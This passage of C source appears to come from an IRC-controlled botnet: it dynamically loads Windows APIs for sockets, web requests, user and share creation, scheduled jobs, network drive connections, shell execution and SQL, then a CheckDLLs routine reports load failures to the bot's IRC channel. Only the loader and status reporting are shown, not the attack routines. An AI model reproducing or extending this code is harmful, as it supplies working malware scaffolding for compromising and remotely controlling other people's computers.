		if (!fGetUserName)
			noadvapi32 = TRUE;
		#endif
	} else {
		noadvapi32err = GetLastError();
		noadvapi32 = TRUE;
	}

	// dynamically load gdi32.dll
 	HMODULE gdi32_dll = GetModuleHandle("gdi32.dll");
    if (gdi32_dll) {
		fCreateDC = (CDC)GetProcAddress(gdi32_dll,"CreateDCA");
		fCreateDIBSection = (CDIBS)GetProcAddress(gdi32_dll,"CreateDIBSection");
		fCreateCompatibleDC = (CCDC)GetProcAddress(gdi32_dll,"CreateCompatibleDC");
		fGetDeviceCaps = (GDC)GetProcAddress(gdi32_dll,"GetDeviceCaps");
		fGetDIBColorTable = (GDIBCT)GetProcAddress(gdi32_dll,"GetDIBColorTable");
		fSelectObject = (SO)GetProcAddress(gdi32_dll,"SelectObject");
		fBitBlt = (BB)GetProcAddress(gdi32_dll,"BitBlt");
		fDeleteDC = (DDC)GetProcAddress(gdi32_dll,"DeleteDC");
		fDeleteObject = (DO)GetProcAddress(gdi32_dll,"DeleteObject");

		if (!fCreateDC || !fCreateDIBSection || !fCreateCompatibleDC || !fGetDeviceCaps 
			|| !fGetDIBColorTable || !fSelectObject || !fBitBlt || !fDeleteDC || !fDeleteObject)
	        nogdi32 = TRUE;
	} else {
		nogdi32err = GetLastError();
		nogdi32 = TRUE;
	}

    // dynamically load ws2_32.dll
 	HMODULE ws2_32_dll = LoadLibrary("ws2_32.dll");
    if (ws2_32_dll) {
	 	fWSAStartup = (WSAS)GetProcAddress(ws2_32_dll,"WSAStartup");
		fWSASocket = (WSASo)GetProcAddress(ws2_32_dll,"WSASocketA");
		fWSAAsyncSelect = (WSAAS)GetProcAddress(ws2_32_dll,"WSAAsyncSelect");
		__fWSAFDIsSet = (WSAFDIS)GetProcAddress(ws2_32_dll,"__WSAFDIsSet");
		fWSAIoctl = (WSAI)GetProcAddress(ws2_32_dll,"WSAIoctl");
		fWSAGetLastError = (WSAGLE)GetProcAddress(ws2_32_dll,"WSAGetLastError");
		fWSACleanup = (WSAC)GetProcAddress(ws2_32_dll,"WSACleanup");
  		fsocket = (SOCK)GetProcAddress(ws2_32_dll,"socket");
		fioctlsocket = (IOCTLS)GetProcAddress(ws2_32_dll,"ioctlsocket");
		fconnect = (CON)GetProcAddress(ws2_32_dll,"connect");
		finet_ntoa = (INTOA)GetProcAddress(ws2_32_dll,"inet_ntoa");
		finet_addr = (IADDR)GetProcAddress(ws2_32_dll,"inet_addr");
		fhtons = (HTONS)GetProcAddress(ws2_32_dll,"htons");
		fhtonl = (HTONL)GetProcAddress(ws2_32_dll,"htonl");
		fntohs = (NTOHS)GetProcAddress(ws2_32_dll,"ntohs");
		fntohl = (NTOHL)GetProcAddress(ws2_32_dll,"ntohl");
		fsend = (SEND)GetProcAddress(ws2_32_dll,"send");
		fsendto = (SENDTO)GetProcAddress(ws2_32_dll,"sendto");
		frecv = (RECV)GetProcAddress(ws2_32_dll,"recv");
		frecvfrom = (RECVFROM)GetProcAddress(ws2_32_dll,"recvfrom");
		fbind = (BIND)GetProcAddress(ws2_32_dll,"bind");
		fselect = (SEL)GetProcAddress(ws2_32_dll,"select");
		flisten = (LIS)GetProcAddress(ws2_32_dll,"listen");
		faccept = (ACC)GetProcAddress(ws2_32_dll,"accept");
		fsetsockopt = (SSO)GetProcAddress(ws2_32_dll,"setsockopt");
		fgetsockname = (GSN)GetProcAddress(ws2_32_dll,"getsockname");
		fgethostname = (GHN)GetProcAddress(ws2_32_dll,"gethostname");
		fgethostbyname = (GHBN)GetProcAddress(ws2_32_dll,"gethostbyname");
		fgethostbyaddr = (GHBA)GetProcAddress(ws2_32_dll,"gethostbyaddr");
		fgetpeername = (GPN)GetProcAddress(ws2_32_dll,"getpeername");
		fclosesocket = (CLSO)GetProcAddress(ws2_32_dll,"closesocket");

		if (!fWSAStartup || !fWSASocket || !fWSAAsyncSelect || !fWSAIoctl || !fWSAGetLastError 
			|| !fWSACleanup || !fsocket || !fioctlsocket || !fconnect || !finet_ntoa || !finet_addr
			|| !fhtons || !fhtonl || !fntohs || !fsend || !fsendto || !frecv || !frecvfrom || !fbind
			|| !fselect || !flisten || !faccept || !fsetsockopt || !fgetsockname || !fgethostname
			|| !fgethostbyname || !fgethostbyaddr || !fclosesocket)	
	        nows2_32 = TRUE;
	} else {
		nows2_32err = GetLastError();
		nows2_32 = TRUE;
	}

	// dynamically load wininet.dll
	HMODULE wininet_dll = LoadLibrary("wininet.dll");
    if (wininet_dll) {
		fInternetGetConnectedState = (IGCS)GetProcAddress(wininet_dll, "InternetGetConnectedState");
	 	fInternetGetConnectedStateEx = (IGCSE)GetProcAddress(wininet_dll, "InternetGetConnectedStateEx");
	 	fHttpOpenRequest = (HOR)GetProcAddress(wininet_dll, "HttpOpenRequestA");
	 	fHttpSendRequest = (HSR)GetProcAddress(wininet_dll, "HttpSendRequestA");
	 	fInternetConnect = (IC)GetProcAddress(wininet_dll, "InternetConnectA");
	 	fInternetOpen = (IO)GetProcAddress(wininet_dll, "InternetOpenA");
	 	fInternetOpenUrl = (IOU)GetProcAddress(wininet_dll, "InternetOpenUrlA");
	 	fInternetCrackUrl = (ICU)GetProcAddress(wininet_dll, "InternetCrackUrlA");
	 	fInternetReadFile = (IRF)GetProcAddress(wininet_dll, "InternetReadFile");
	 	fInternetCloseHandle = (ICH)GetProcAddress(wininet_dll, "InternetCloseHandle");

		if (!fInternetGetConnectedState || !fInternetGetConnectedStateEx || !fHttpOpenRequest 
			|| !fHttpSendRequest || !fInternetConnect || !fInternetOpen || !fInternetOpenUrl
			|| !fInternetCrackUrl || !fInternetReadFile || !fInternetCloseHandle) 
			nowininet = TRUE;

		if (fInternetOpen) {
				ih = fInternetOpen("Mozilla/4.0 (compatible)", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
				if (ih == NULL) ih = 0;
		}
	} else {
		nowinineterr = GetLastError();
		nowininet = TRUE;
		ih = 0;
	}

	#ifndef NO_PING
	// dynamically load icmp.dll
 	HMODULE icmp_dll = LoadLibrary("icmp.dll");
    if (icmp_dll) {
	 	fIcmpCreateFile = (ICF)GetProcAddress(icmp_dll,"IcmpCreateFile");
 		fIcmpCloseHandle = (ICH)GetProcAddress(icmp_dll,"IcmpCloseHandle");
 		fIcmpSendEcho = (ISE)GetProcAddress(icmp_dll,"IcmpSendEcho");

		if (!fIcmpCreateFile || !fIcmpCloseHandle || !fIcmpSendEcho)
	        noicmp = TRUE;
	} else {
		noicmperr = GetLastError();
		noicmp = TRUE;
	}
	#endif
	
	// dynamically load netapi32.dll
 	HMODULE netapi32_dll = LoadLibrary("netapi32.dll");
    if (netapi32_dll) {
	 	fNetShareAdd = (NSA)GetProcAddress(netapi32_dll,"NetShareAdd");
	 	fNetShareDel = (NSD)GetProcAddress(netapi32_dll,"NetShareDel");
		fNetShareEnum = (NSE)GetProcAddress(netapi32_dll,"NetShareEnum");
	 	fNetScheduleJobAdd = (NSJA)GetProcAddress(netapi32_dll,"NetScheduleJobAdd");
	 	fNetApiBufferFree = (NABF)GetProcAddress(netapi32_dll,"NetApiBufferFree");
	 	fNetRemoteTOD = (NRTOD)GetProcAddress(netapi32_dll,"NetRemoteTOD");
	 	fNetUserAdd = (NUA)GetProcAddress(netapi32_dll,"NetUserAdd");
	 	fNetUserDel = (NUD)GetProcAddress(netapi32_dll,"NetUserDel");
	 	fNetUserEnum = (NUE)GetProcAddress(netapi32_dll,"NetUserEnum");
	 	fNetUserGetInfo = (NUGI)GetProcAddress(netapi32_dll,"NetUserGetInfo");
		fNetMessageBufferSend = (NMBS)GetProcAddress(netapi32_dll,"NetMessageBufferSend");
		
		if (!fNetShareAdd || !fNetShareDel || !fNetShareEnum || !fNetScheduleJobAdd 
			|| !fNetApiBufferFree || !fNetRemoteTOD || !fNetUserAdd || !fNetUserDel
			|| !fNetUserEnum || !fNetUserGetInfo || !fNetMessageBufferSend)	
	        nonetapi32 = TRUE;
	} else {
		nonetapi32err = GetLastError();
		nonetapi32 = TRUE;
	}

	// dynamically load dnsapi.dll
 	HMODULE dnsapi_dll = LoadLibrary("dnsapi.dll");
    if (dnsapi_dll) {
	 	fDnsFlushResolverCache = (DFRC)GetProcAddress(dnsapi_dll,"DnsFlushResolverCache");
	 	fDnsFlushResolverCacheEntry_A = (DFRCEA)GetProcAddress(dnsapi_dll,"DnsFlushResolverCacheEntry_A");

		if (!fDnsFlushResolverCache || !fDnsFlushResolverCacheEntry_A)
	        nodnsapi = TRUE;
	} else {
		nodnsapierr = GetLastError();
		nodnsapi = TRUE;
	}

	// dynamically load iphlpapi.dll
 	HMODULE iphlpapi_dll = LoadLibrary("iphlpapi.dll");
    if (iphlpapi_dll) {
	 	fGetIpNetTable = (GINT)GetProcAddress(iphlpapi_dll,"GetIpNetTable");
	 	fDeleteIpNetEntry = (DINE)GetProcAddress(iphlpapi_dll,"DeleteIpNetEntry");

		if (!fGetIpNetTable || !fDeleteIpNetEntry)	
	        noiphlpapi = TRUE;
	} else {
		noiphlpapierr = GetLastError();
		noiphlpapi = TRUE;
	}

	// dynamically load mpr.dll
 	HMODULE mpr_dll = LoadLibrary("mpr.dll");
    if (mpr_dll) {
	 	fWNetAddConnection2 = (WNAC2)GetProcAddress(mpr_dll,"WNetAddConnection2A");
	 	fWNetAddConnection2W = (WNAC2W)GetProcAddress(mpr_dll,"WNetAddConnection2W");
	 	fWNetCancelConnection2 = (WNCC2)GetProcAddress(mpr_dll,"WNetCancelConnection2A");
	 	fWNetCancelConnection2W = (WNCC2W)GetProcAddress(mpr_dll,"WNetCancelConnection2W");

		if (!fWNetAddConnection2 || !fWNetAddConnection2W 
			|| !fWNetCancelConnection2 || !fWNetCancelConnection2W)	
	        nompr = TRUE;
	} else {
		nomprerr = GetLastError();
		nompr = TRUE;
	}

	// dynamically load shell32.dll
 	HMODULE shell32_dll = LoadLibrary("shell32.dll");
    if (shell32_dll) {
	 	fShellExecute = (SE)GetProcAddress(shell32_dll,"ShellExecuteA");
		fSHChangeNotify = (SHCN)GetProcAddress(shell32_dll,"SHChangeNotify");
 
		if (!fShellExecute || !fSHChangeNotify)
	        noshell32 = TRUE;
	} else {
		noshell32err = GetLastError();
		noshell32 = TRUE;
	}

	// dynamically load odbc32.dll
 	HMODULE odbc32_dll = LoadLibrary("odbc32.dll");
    if (odbc32_dll) {
	 	fSQLDriverConnect = (SQLDC)GetProcAddress(odbc32_dll,"SQLDriverConnect");
	 	fSQLSetEnvAttr = (SQLSEA)GetProcAddress(odbc32_dll,"SQLSetEnvAttr");
	 	fSQLExecDirect = (SQLED)GetProcAddress(odbc32_dll,"SQLExecDirect");
	 	fSQLAllocHandle = (SQLAH)GetProcAddress(odbc32_dll,"SQLAllocHandle");
	 	fSQLFreeHandle = (SQLFH)GetProcAddress(odbc32_dll,"SQLFreeHandle");
	 	fSQLDisconnect = (SQLD)GetProcAddress(odbc32_dll,"SQLDisconnect");
 
		if (!fSQLDriverConnect || !fSQLSetEnvAttr || !fSQLExecDirect
			|| !fSQLAllocHandle || !fSQLFreeHandle || !fSQLDisconnect)
	        noodbc32 = TRUE;
	} else {
		noodbc32err = GetLastError();
		noodbc32 = TRUE;
	}


		
	return TRUE;
}

void CheckDLLs(SOCKET sock, char *chan, BOOL notice, BOOL silent)
{
	char sendbuf[IRCLINE];

	if (nokernel32) {
		sprintf(sendbuf,"Kernel32.dll failed. <%d>", nokernel32err);
		irc_privmsg(sock, chan, sendbuf, notice);
	}
	if (nouser32) {
		sprintf(sendbuf,"User32.dll failed. <%d>", nouser32err);
		irc_privmsg(sock, chan, sendbuf, notice);
	}
	if (noadvapi32) {
		sprintf(sendbuf,"Advapi32.dll failed. <%d>", noadvapi32err);
		irc_privmsg(sock, chan, sendbuf, notice);
	}
	if (nogdi32) {
		sprintf(sendbuf,"Gdi32.dll failed. <%d>", nogdi32err);
		irc_privmsg(sock, chan, sendbuf, notice);
	}
	if (nows2_32) {
		sprintf(sendbuf,"Ws2_32.dll failed. <%d>", nows2_32err);
		irc_privmsg(sock, chan, sendbuf, notice);
	}
	if (nowininet) {
		sprintf(sendbuf,"Wininet.dll failed. <%d>", nowinineterr);
		irc_privmsg(sock, chan, sendbuf, notice);
	}
	if (noicmp) {
		sprintf(sendbuf,"Icmp.dll failed. <%d>", noicmperr);
		irc_privmsg(sock, chan, sendbuf, notice);
	}
	if (nonetapi32) {
		sprintf(sendbuf,"Netapi32.dll failed. <%d>", nonetapi32err);
		irc_privmsg(sock, chan, sendbuf, notice);
	}
	if (nodnsapi) {
		sprintf(sendbuf,"Dnsapi.dll failed. <%d>", nodnsapierr);
		irc_privmsg(sock, chan, sendbuf, notice);
	}
	if (noiphlpapi) {
		sprintf(sendbuf,"Iphlpapi.dll failed. <%d>", noiphlpapierr);
		irc_privmsg(sock, chan, sendbuf, notice);
	}
	if (nompr) {
		sprintf(sendbuf,"Mpr32.dll failed. <%d>", nomprerr);
		irc_privmsg(sock, chan, sendbuf, notice);
	}
	if (noshell32) {
		sprintf(sendbuf,"Shell32.dll failed. <%d>", noshell32err);
		irc_privmsg(sock, chan, sendbuf, notice);
	}
	if (noodbc32) {
		sprintf(sendbuf,"Odbc32.dll failed. <%d>", noodbc32err);
		irc_privmsg(sock, chan, sendbuf, notice);
	}
	#ifndef NO_CAPTURE
	if (noavicap32) {
		sprintf(sendbuf,"Avicap32.dll failed. <%d>", noavicap32err);
		irc_privmsg(sock, chan, sendbuf, notice);
	}
	#endif

	sprintf(sendbuf,"[MAIN]: DLL test complete.");
	if (!silent) irc_privmsg(sock, chan, sendbuf, notice); 
//	addlog(sendbuf);

	return;
}